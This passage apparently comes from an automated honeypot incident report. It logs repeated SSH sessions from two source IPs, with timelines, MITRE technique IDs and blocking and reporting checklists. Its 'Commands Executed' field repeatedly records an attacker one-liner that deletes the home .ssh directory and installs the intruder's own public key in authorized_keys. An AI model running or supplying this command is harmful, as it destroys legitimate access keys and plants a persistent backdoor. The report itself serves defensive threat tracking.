| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:58:11` | `cowrie.session.connect` |
| `2026-05-03 19:58:11` | `cowrie.client.version` |
| `2026-05-03 19:58:11` | `cowrie.client.kex` |
| `2026-05-03 19:58:12` | `cowrie.login.success` |
| `2026-05-03 19:58:12` | `cowrie.session.params` |
| `2026-05-03 19:58:12` | `cowrie.command.input` |
| `2026-05-03 19:58:12` | `cowrie.command.failed` |
| `2026-05-03 19:58:12` | `cowrie.log.closed` |
| `2026-05-03 19:58:12` | `cowrie.session.params` |
| `2026-05-03 19:58:12` | `cowrie.command.input` |
| `2026-05-03 19:58:12` | `cowrie.session.file_download` |
| `2026-05-03 19:58:12` | `cowrie.log.closed` |
| `2026-05-03 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428eb1585707

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:58 |
| **Last Seen** | 2026-05-03 19:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:58:14` | `cowrie.session.connect` |
| `2026-05-03 19:58:14` | `cowrie.client.version` |
| `2026-05-03 19:58:14` | `cowrie.client.kex` |
| `2026-05-03 19:58:14` | `cowrie.login.success` |
| `2026-05-03 19:58:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ee5c74b767f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:59 |
| **Last Seen** | 2026-05-03 19:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:59:09` | `cowrie.session.connect` |
| `2026-05-03 19:59:09` | `cowrie.client.version` |
| `2026-05-03 19:59:09` | `cowrie.client.kex` |
| `2026-05-03 19:59:09` | `cowrie.login.success` |
| `2026-05-03 19:59:09` | `cowrie.session.params` |
| `2026-05-03 19:59:09` | `cowrie.command.input` |
| `2026-05-03 19:59:09` | `cowrie.command.failed` |
| `2026-05-03 19:59:09` | `cowrie.log.closed` |
| `2026-05-03 19:59:09` | `cowrie.session.params` |
| `2026-05-03 19:59:09` | `cowrie.command.input` |
| `2026-05-03 19:59:09` | `cowrie.session.file_download` |
| `2026-05-03 19:59:09` | `cowrie.log.closed` |
| `2026-05-03 19:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f07e41a98f0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 19:59 |
| **Last Seen** | 2026-05-03 19:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 19:59:11` | `cowrie.session.connect` |
| `2026-05-03 19:59:11` | `cowrie.client.version` |
| `2026-05-03 19:59:11` | `cowrie.client.kex` |
| `2026-05-03 19:59:11` | `cowrie.login.success` |
| `2026-05-03 19:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11fd66690d2b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:00 |
| **Last Seen** | 2026-05-03 20:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:00:06` | `cowrie.session.connect` |
| `2026-05-03 20:00:06` | `cowrie.client.version` |
| `2026-05-03 20:00:06` | `cowrie.client.kex` |
| `2026-05-03 20:00:07` | `cowrie.login.success` |
| `2026-05-03 20:00:07` | `cowrie.session.params` |
| `2026-05-03 20:00:07` | `cowrie.command.input` |
| `2026-05-03 20:00:07` | `cowrie.command.failed` |
| `2026-05-03 20:00:07` | `cowrie.log.closed` |
| `2026-05-03 20:00:07` | `cowrie.session.params` |
| `2026-05-03 20:00:07` | `cowrie.command.input` |
| `2026-05-03 20:00:07` | `cowrie.session.file_download` |
| `2026-05-03 20:00:07` | `cowrie.log.closed` |
| `2026-05-03 20:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2cdb11394b0b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:00 |
| **Last Seen** | 2026-05-03 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:00:09` | `cowrie.session.connect` |
| `2026-05-03 20:00:09` | `cowrie.client.version` |
| `2026-05-03 20:00:09` | `cowrie.client.kex` |
| `2026-05-03 20:00:09` | `cowrie.login.success` |
| `2026-05-03 20:00:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7815be5095f

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 20:00 |
| **Last Seen** | 2026-05-03 20:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:00:33` | `cowrie.session.connect` |
| `2026-05-03 20:00:33` | `cowrie.client.version` |
| `2026-05-03 20:00:33` | `cowrie.client.kex` |
| `2026-05-03 20:00:34` | `cowrie.login.success` |
| `2026-05-03 20:00:34` | `cowrie.session.params` |
| `2026-05-03 20:00:34` | `cowrie.command.input` |
| `2026-05-03 20:00:34` | `cowrie.command.failed` |
| `2026-05-03 20:00:34` | `cowrie.log.closed` |
| `2026-05-03 20:00:35` | `cowrie.session.params` |
| `2026-05-03 20:00:35` | `cowrie.command.input` |
| `2026-05-03 20:00:35` | `cowrie.session.file_download` |
| `2026-05-03 20:00:35` | `cowrie.log.closed` |
| `2026-05-03 20:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79579c26aeb1

| Field | Detail |
|---|---|
| **Source IP** | `79.55.224[.]44` |
| **First Seen** | 2026-05-03 20:00 |
| **Last Seen** | 2026-05-03 20:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:00:37` | `cowrie.session.connect` |
| `2026-05-03 20:00:37` | `cowrie.client.version` |
| `2026-05-03 20:00:37` | `cowrie.client.kex` |
| `2026-05-03 20:00:37` | `cowrie.login.success` |
| `2026-05-03 20:00:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.55.224[.]44` to AbuseIPDB if not already reported
- [ ] Block `79.55.224[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59c3d1379fae

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:01 |
| **Last Seen** | 2026-05-03 20:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:01:01` | `cowrie.session.connect` |
| `2026-05-03 20:01:01` | `cowrie.client.version` |
| `2026-05-03 20:01:01` | `cowrie.client.kex` |
| `2026-05-03 20:01:01` | `cowrie.login.success` |
| `2026-05-03 20:01:02` | `cowrie.session.params` |
| `2026-05-03 20:01:02` | `cowrie.command.input` |
| `2026-05-03 20:01:02` | `cowrie.command.failed` |
| `2026-05-03 20:01:02` | `cowrie.log.closed` |
| `2026-05-03 20:01:02` | `cowrie.session.params` |
| `2026-05-03 20:01:02` | `cowrie.command.input` |
| `2026-05-03 20:01:02` | `cowrie.session.file_download` |
| `2026-05-03 20:01:02` | `cowrie.log.closed` |
| `2026-05-03 20:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03d5744792e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:01 |
| **Last Seen** | 2026-05-03 20:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:01:03` | `cowrie.session.connect` |
| `2026-05-03 20:01:03` | `cowrie.client.version` |
| `2026-05-03 20:01:04` | `cowrie.client.kex` |
| `2026-05-03 20:01:04` | `cowrie.login.success` |
| `2026-05-03 20:01:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-804d8087bdb0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:03 |
| **Last Seen** | 2026-05-03 20:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:03:57` | `cowrie.session.connect` |
| `2026-05-03 20:03:57` | `cowrie.client.version` |
| `2026-05-03 20:03:57` | `cowrie.client.kex` |
| `2026-05-03 20:03:57` | `cowrie.login.success` |
| `2026-05-03 20:03:58` | `cowrie.session.params` |
| `2026-05-03 20:03:58` | `cowrie.command.input` |
| `2026-05-03 20:03:58` | `cowrie.command.failed` |
| `2026-05-03 20:03:58` | `cowrie.log.closed` |
| `2026-05-03 20:03:58` | `cowrie.session.params` |
| `2026-05-03 20:03:58` | `cowrie.command.input` |
| `2026-05-03 20:03:58` | `cowrie.session.file_download` |
| `2026-05-03 20:03:58` | `cowrie.log.closed` |
| `2026-05-03 20:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a8b91c80cc7e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:04 |
| **Last Seen** | 2026-05-03 20:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:04:00` | `cowrie.session.connect` |
| `2026-05-03 20:04:00` | `cowrie.client.version` |
| `2026-05-03 20:04:00` | `cowrie.client.kex` |
| `2026-05-03 20:04:00` | `cowrie.login.success` |
| `2026-05-03 20:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d023b0536ad

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:04 |
| **Last Seen** | 2026-05-03 20:05 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:04:58` | `cowrie.session.connect` |
| `2026-05-03 20:04:58` | `cowrie.client.version` |
| `2026-05-03 20:04:58` | `cowrie.client.kex` |
| `2026-05-03 20:04:58` | `cowrie.login.success` |
| `2026-05-03 20:04:58` | `cowrie.session.params` |
| `2026-05-03 20:04:58` | `cowrie.command.input` |
| `2026-05-03 20:04:58` | `cowrie.command.failed` |
| `2026-05-03 20:04:59` | `cowrie.log.closed` |
| `2026-05-03 20:04:59` | `cowrie.session.params` |
| `2026-05-03 20:04:59` | `cowrie.command.input` |
| `2026-05-03 20:04:59` | `cowrie.session.file_download` |
| `2026-05-03 20:04:59` | `cowrie.log.closed` |
| `2026-05-03 20:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8bb25f2583e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:05 |
| **Last Seen** | 2026-05-03 20:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:05:00` | `cowrie.session.connect` |
| `2026-05-03 20:05:00` | `cowrie.client.version` |
| `2026-05-03 20:05:00` | `cowrie.client.kex` |
| `2026-05-03 20:05:01` | `cowrie.login.success` |
| `2026-05-03 20:05:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df1701ebb7f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:05 |
| **Last Seen** | 2026-05-03 20:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:05:57` | `cowrie.session.connect` |
| `2026-05-03 20:05:57` | `cowrie.client.version` |
| `2026-05-03 20:05:57` | `cowrie.client.kex` |
| `2026-05-03 20:05:57` | `cowrie.login.success` |
| `2026-05-03 20:05:57` | `cowrie.session.params` |
| `2026-05-03 20:05:57` | `cowrie.command.input` |
| `2026-05-03 20:05:57` | `cowrie.command.failed` |
| `2026-05-03 20:05:58` | `cowrie.log.closed` |
| `2026-05-03 20:05:58` | `cowrie.session.params` |
| `2026-05-03 20:05:58` | `cowrie.command.input` |
| `2026-05-03 20:05:58` | `cowrie.session.file_download` |
| `2026-05-03 20:05:58` | `cowrie.log.closed` |
| `2026-05-03 20:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b9667ad8d8d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:05 |
| **Last Seen** | 2026-05-03 20:06 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:05:59` | `cowrie.session.connect` |
| `2026-05-03 20:05:59` | `cowrie.client.version` |
| `2026-05-03 20:05:59` | `cowrie.client.kex` |
| `2026-05-03 20:06:00` | `cowrie.login.success` |
| `2026-05-03 20:06:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.205[.]128` to AbuseIPDB if not already reported
- [ ] Block `165.154.205[.]128` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1bdfef1165e8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.205[.]128` |
| **First Seen** | 2026-05-03 20:06 |
| **Last Seen** | 2026-05-03 20:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-03 20:06:54` | `cowrie.session.connect` |
| `2026-05-03 20:06:54` | `cowrie.client.version` |
| `2026-05-03 20:06:55` | `cowrie.client.kex` |
| `2026-05-03 20:06:55` | `cowrie.login.success` |
| `2026-05-03 20:06:55` | `cowrie.session.params` |
| `2026-05-03 20:06:55` | `cowrie.command.input` |
